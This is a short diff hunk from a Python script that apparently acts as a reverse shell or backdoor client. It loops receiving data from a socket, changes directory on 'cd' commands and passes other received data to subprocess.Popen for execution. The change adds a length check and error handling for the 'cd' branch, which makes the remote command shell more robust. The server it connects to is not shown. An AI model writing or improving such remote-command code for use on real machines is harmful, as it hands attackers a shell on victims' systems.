@@ -18,8 +18,11 @@ while True:
 
     data = s.recv(1024)
 
-    if data[:2].decode("utf-8") == "cd":
-        os.chdir(data[3:].decode("utf-8"))
+    if data[:2].decode("utf-8") == "cd" and len(data.decode("utf-8").rstrip()) > 3:
+        try:
+            os.chdir(data[3:].decode("utf-8"))
+        except FileNotFoundError as ferror:
+            print(ferror)
 
     if len(data) > 0:
         cmd = subprocess.Popen(
